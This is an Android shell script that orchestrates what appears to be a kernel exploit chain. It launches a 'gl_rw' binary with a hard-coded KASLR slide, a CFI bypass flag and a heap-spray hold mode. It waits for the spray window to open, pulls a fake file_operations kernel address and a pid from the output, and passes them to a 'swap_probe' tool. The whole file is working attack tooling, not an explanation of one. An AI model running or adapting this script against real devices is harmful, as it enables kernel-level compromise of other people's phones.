#!/system/bin/sh
D=/data/local/tmp
L=$D/rw_chain.log
echo "$(date +%H:%M:%S) NF start" >> $L
rm -f $D/gl_out.txt
MODE4_ONLY=1 MODE4_SLIDE_SWAP=1 KASLR_SLIDE=0x2476a00000 MODE4_SWAP_NOCFI=1 MODE4_SWAP_HOLD=1 $D/gl_rw > $D/gl_out.txt 2>&1 &
NPID=$!
i=0
while [ $i -lt 120 ]; do
  grep -q "SWAP_HOLD\|HOLD: spray live" $D/gl_out.txt 2>/dev/null && break
  kill -0 $NPID 2>/dev/null || { grep -q "SWAP_HOLD\|HOLD: spray live" $D/gl_out.txt 2>/dev/null && break; echo "$(date +%H:%M:%S) NF exited nohold" >> $L; exit 1; }
  sleep 2; i=$((i+1))
done
echo "$(date +%H:%M:%S) WINDOW OPEN" >> $L
FF=$(grep -o "fake_fops (ffffff[0-9a-f]*)" $D/gl_out.txt | tail -1 | grep -o "ffffff[0-9a-f]*")
GLPID=$(grep -o "pid=[0-9]*" $D/gl_out.txt | head -1 | cut -d= -f2)
echo "$(date +%H:%M:%S) probe ff=$FF pid=$GLPID" >> $L
[ -n "$FF" ] || { echo "noff" >> $L; exit 1; }
$D/swap_probe $FF 0x2476a00000 $GLPID > $D/probe_out.txt 2>&1
echo "$(date +%H:%M:%S) probe exit=$?" >> $L
